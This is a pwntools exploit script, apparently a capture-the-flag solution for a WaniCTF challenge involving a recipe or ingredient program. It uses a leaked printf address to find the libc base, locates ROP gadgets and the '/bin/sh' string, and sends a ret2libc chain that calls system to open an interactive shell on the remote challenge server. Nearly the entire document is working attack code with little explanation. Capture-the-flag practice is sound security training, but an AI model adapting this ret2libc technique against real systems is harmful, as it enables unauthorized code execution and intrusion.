from pwn import *

gs = '''
b *main+491
continue
'''

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("chal-lz56g6.wanictf.org", 9005)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

io.recvuntil(" = ")
printf_address = int(io.recvline().strip(), 16)
print(f"[+] Printf Address: {hex(printf_address)}")

libc.address = printf_address - libc.symbols.printf

print(f"[+] System: {hex(libc.symbols.system)}")

print(f"[+] Libc Base: {hex(libc.address)}")


system_address = libc.symbols.system

ret = next(libc.search(asm("ret", arch='amd64'), executable=True))
#ret = libc.address + 0x000000000002882f
pop_rsi_r15 = next(libc.search(asm("pop rsi ; pop r15 ; ret", arch='amd64'), executable=True))
#pop_rsi_r15 = libc.address + 0x10f759
pop_rdi = next(libc.search(asm("pop rdi ; ret", arch='amd64'), executable=True)) 
#pop_rdi = libc.address + 0x10f75b
bin_sh = next(libc.search(b"/bin/sh\x00"))
#bin_sh = libc.address + 0x1cb42f

print(f"[+] Pop rsi r15: {hex(pop_rsi_r15)}")
print(f"[+] Pop rdi: {hex(pop_rdi)}")
print(f"[+] ret: {hex(ret)}")
print(f"[+] bin_sh: {hex(bin_sh)}")

# Primer Ingrediente
io.sendlineafter(": ", b"test") # name ingredient
io.sendlineafter(": ", b"1") # calories per gram
io.sendlineafter(": ", b"1")


# Segundo Ingrediente
io.sendlineafter(": ", b"test") # name ingredient
io.sendlineafter(": ", b"1") # calories per gram
io.sendlineafter(": ", b"1")

# Tercer Ingrediente
io.sendlineafter(": ", b"test") # name ingredient
io.sendlineafter(": ", b"1") # calories per gram
io.sendlineafter(": ", b"1")

payload = b"".join([
    p64(pop_rdi),
    p64(bin_sh),
    p64(ret),
    p64(system_address)
])

io.sendlineafter(": ", payload)
io.sendlineafter(": ", b"A")
#io.sendlineafter(": ", b".")

io.interactive()
